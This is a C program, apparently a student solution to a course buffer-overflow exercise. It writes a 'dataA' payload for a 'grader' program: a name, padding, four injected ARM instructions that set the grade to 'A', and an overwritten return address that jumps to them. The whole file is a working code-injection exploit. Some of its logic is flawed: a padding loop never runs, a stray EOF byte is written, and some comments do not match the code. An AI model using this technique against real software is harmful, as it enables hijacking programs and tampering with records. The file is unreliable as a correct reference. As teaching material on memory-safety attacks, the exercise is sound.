/*
creates a file named dataA to exploit the grader program and assign an 'A' grade.
the file includes:
1. student name followed by a null byte
2. padding to overflow the buffer
3. machine instructions to set the grade to 'A'
4. an overwritten return address directing execution to the injected instructions
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/*
main function behavior:
- accepts no command-line arguments
- does not read from stdin
- does not write to stdout or stderr (except on failure)
- writes crafted bytes to "dataA" file
- returns 0 on success, non-zero on failure
*/
int main(void) {
    /* student name, truncated to avoid newline characters */
    const char *student_name = "Anish Solo";
    /* ASCII value for 'A' */
    const unsigned int ascii_A = 0x41;

    /* predefined memory addresses based on memory map analysis */
    unsigned long grade_address = 0x420044;         /* address of the grade variable */
    unsigned long injected_code_address = 0x42007c;  /* address where injected instructions reside */
    unsigned long return_jump_address = 0x40089c;    /* address to jump back after injection */

    /* generate machine instructions */
    unsigned int mov_instruction = MiniAssembler_mov(0, ascii_A);                            /* mov w0, #A */
    unsigned int adr_instruction = MiniAssembler_adr(1, grade_address, injected_code_address + 4); /* adr x1, grade_address */
    unsigned int strb_instruction = MiniAssembler_strb(0, 1);                                 /* strb w0, [x1] */
    unsigned int branch_instruction = MiniAssembler_b(return_jump_address, injected_code_address + 12); /* b return_jump_address */

    /* open dataA file in binary write mode */
    FILE *file = fopen("dataA", "wb");
    if (!file) {
        return 1; /* exit if file cannot be opened */
    }

    /* write the student's name */
    fwrite(student_name, 1, 10, file); /* "Anish Solo" is 10 bytes */

    /* append a null byte to terminate the name string */
    fputc('\0', file);

    /* add padding to overflow the buffer (total buffer size 48 bytes) */
    int total_bytes = 11; /* 10 name bytes + 1 null byte */
    for (int pad = 0; pad < (48 - total_bytes); pad++) {
        fputc('\0', file);
    }
    total_bytes = 48;

    /* insert the crafted machine instructions */
    fwrite(&mov_instruction, sizeof(mov_instruction), 1, file);            /* mov w0, #A */
    fwrite(&adr_instruction, sizeof(adr_instruction), 1, file);            /* adr x1, grade_address */
    fwrite(&strb_instruction, sizeof(strb_instruction), 1, file);          /* strb w0, [x1] */
    fwrite(&branch_instruction, sizeof(branch_instruction), 1, file);      /* b return_jump_address */
    total_bytes += 16; /* 4 instructions x 4 bytes each */

    /* write remaining padding to reach 48 bytes */
    while (total_bytes < 48) {
        fputc('\0', file);
        total_bytes++;
    }

    /* overwrite the return address to point to injected instructions */
    unsigned long fake_return = injected_code_address;
    fwrite(&fake_return, sizeof(fake_return), 1, file);

    /* write EOF to ensure no additional characters */
    fputc(EOF, file);

    /* close the file after writing all data */
    fclose(file);

    return 0; /* indicate successful execution */
}